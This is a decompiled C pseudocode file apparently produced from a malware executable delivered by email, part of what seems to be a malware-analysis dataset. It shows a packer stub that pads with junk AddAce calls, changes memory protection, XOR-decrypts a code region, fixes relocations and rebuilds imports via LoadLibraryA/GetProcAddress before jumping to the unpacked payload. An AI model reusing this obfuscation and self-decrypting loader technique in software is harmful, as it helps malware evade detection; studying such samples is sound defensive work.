// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0115/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401000(word32 ecx, word32 ebx)
{
fn00401000_entry:
l00401000:
	Eq_2 * esi_1058 = AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + 0x00000023 + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000)
	Eq_2 * ebp_1099 = null
	branch AreAnyAccessesGranted(0xFFFFFFFF, 0xFFFFFFFF) != 0x00000000 l004012F9
l004012F6:
	esi_1058 = esi_1058 - 0x00000022;
l004012F9:
	fp->dwFFFFFFE4 = 0x00000059;
	CloseHandle(0xFFFFFFFF)
	fp->dwFFFFFFE4 = fp - 0x00000008;
	fp->dwFFFFFFE4 = 0x00000040;
	fp->dwFFFFFFE4 = 0x00003000;
	fp->dwFFFFFFE4 = 0x00401000;
	VirtualProtect(0x00000000, 0x00000000, 0xFFFFFFFF, 0xFFFFFFFF)
	Eq_697 * edx_1089 = null
l00401320:
	branch ebp_1099 != esi_1058 l00401329
l00401327:
	ebp_1099 = null;
l00401329:
	byte v15_1108 = edx_1089->b401480 ^ ebp_1099->b404000
	edx_1089->b401480 = v15_1108;
	edx_1089 = edx_1089 + 1;
	ebp_1099 = ebp_1099 + 1;
	branch edx_1089 <u (Eq_697 *) 0x00001420 l00401320
l00401349:
	Eq_720 * esi_1116 = &globals->t402760
	up32 edi_1120 = 0x00000000
	up32 dwLoc04_1124 = 0x00000000
l00401370:
	Eq_726 eax_1133 = esi_1116->dw0004 - 0x00000008 >>u 0x00000001
	Eq_734 * ecx_1136 = &esi_1116->t0008
	branch eax_1133 <= 0x00000000 l004013AB
l0040137F:
	Eq_726 ebx_1281 = eax_1133
l00401381:
	word32 eax_1285 = (word32) ecx_1136->w0000
	branch (eax_1285 & 0x0000F000) != 0x00003000 l0040139F
l00401394:
	Eq_756 * eax_1298 = (eax_1285 & 0x00000FFF) + esi_1116->dw0000
	eax_1298->dw401200 = eax_1298->dw401200 + 0xF0401200;
l0040139F:
	ecx_1136 = ecx_1136 + 1;
	ebx_1281 = ebx_1281 - 0x00000001;
	branch ebx_1281 != 0x00000000 l00401381
l004013A7:
	edi_1120 = dwLoc04_1124;
l004013AB:
	edi_1120 = edi_1120 + esi_1116->dw0004;
	dwLoc04_1124 = edi_1120;
	esi_1116 = esi_1116 + Mem1109[esi_1116 + 0x00000004:word32];
	branch edi_1120 <u 0x000000E4 l00401370
l004013C0:
	Eq_771 * esi_1152 = &globals->t401F5C
	Eq_771 * dwLoc04_1153 = &globals->t401F5C
	esi_1177 = esi_1152;
	branch globals->dw401F6C == 0x00000000 l00401442
l004013D3:
	Eq_771 * esi_1177
	Eq_789 eax_1182 = LoadLibraryA(esi_1177->dw000C + 0x00401200)
	branch eax_1182 == 0x00000000 l00401435
l004013E8:
	Eq_805 * edi_1205 = esi_1177->ptr0000
	branch edi_1205 != null l004013F1
l004013EE:
	edi_1205 = esi_1177->ptr0010;
l004013F1:
	Eq_814 eax_1211 = edi_1205->u401200
	Eq_818 * edi_1212 = &edi_1205->u401200
	word32 esi_1213 = Mem1109[esi_1177 + 0x00000010:word32] + 0x00401200
	byte S_1216 = cond(eax_1211)
	branch eax_1211 == 0x00000000 l00401431
l004013FF:
	word32 eax_1250
	branch S_1216 l00401411
l00401401:
	eax_1250 = GetProcAddress(eax_1182, (word32) edi_1212->t0000);
	goto l00401420
l00401411:
	eax_1250 = GetProcAddress(eax_1182, eax_1211.u1);
l00401420:
	esi_1213->dw0000 = eax_1250;
	edi_1212 = edi_1212 + 1;
	eax_1211 = edi_1212->t0000;
	esi_1213 = esi_1213 + 1;
	S_1216 = cond(eax_1211);
	branch eax_1211 != 0x00000000 l004013FF
l00401431:
	esi_1177 = dwLoc04_1153;
l00401435:
	esi_1177 = esi_1177 + 1;
	dwLoc04_1153 = esi_1177;
	branch esi_1177->ptr0010 != null l004013D3
l00401442:
	0x00401C50()
	ExitProcess(0x00000000)
	int3()
fn00401000_exit:
}

